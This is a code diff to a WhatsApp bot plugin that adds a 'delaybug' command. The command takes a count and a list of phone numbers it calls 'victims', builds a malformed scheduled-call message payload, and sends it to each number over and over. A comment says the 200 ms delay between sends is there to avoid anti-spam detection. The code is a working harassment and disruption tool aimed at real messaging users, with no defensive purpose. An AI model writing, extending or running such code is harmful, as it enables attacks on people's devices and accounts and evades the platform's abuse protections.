@@ -542,18 +542,46 @@ zokou(
 
     async (dest, zk, commandOptions) => {
         const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+
         if (!superUser) return await repondre(mess.prem);
-        if (!arg[0])
+
+        if (!arg[0]) {
             return await repondre(
-                `Use ${prefixe}delaybug amount | numbers\n> Example ${prefixe}delaybug 30 |${
-                    conf.NUMERO_OWNER
-                } or ${prefixe}delaybug ${conf.NUMERO_OWNER.split(",")[0]}`
+                `Use ${prefixe}delaybug amount | numbers\n> Example ${prefixe}delaybug 30 |${conf.NUMERO_OWNER} or ${prefixe}delaybug ${conf.NUMERO_OWNER.split(",")[0]}`
             );
+        }
+
         await loading(dest, zk);
+
         const text = arg.join("");
         let amount = 30;
         let victims = [];
+
+        const [amt, nums] = text.split("|").map(x => x.trim());
+
+        if (!isNaN(parseInt(amt))) {
+            amount = parseInt(amt);
+        }
+
+        if (nums) {
+            victims = nums.split(",").map(x => x.replace(/\D/g, "") + "@s.whatsapp.net");
+        }
+
         const bug = {
             scheduledCallCreationMessage: {
                 callType: "2",
                 scheduledTimestampMs: moment(1000).tz("Asia/Kolkata").valueOf(),
+            },
+        };
+
+        for (let i = 0; i < amount; i++) {
+            for (const victim of victims) {
+                await delay(200); // Limit pou pa detekte antispam
+                await zk.sendMessage(victim, bug);
+            }
+        }
+
+        await react(zk, ms, "✅");
+        await repondre(`🕷️ Sent ${amount} bug(s) to:\n${victims.join("\n")}`);
+    }
+);
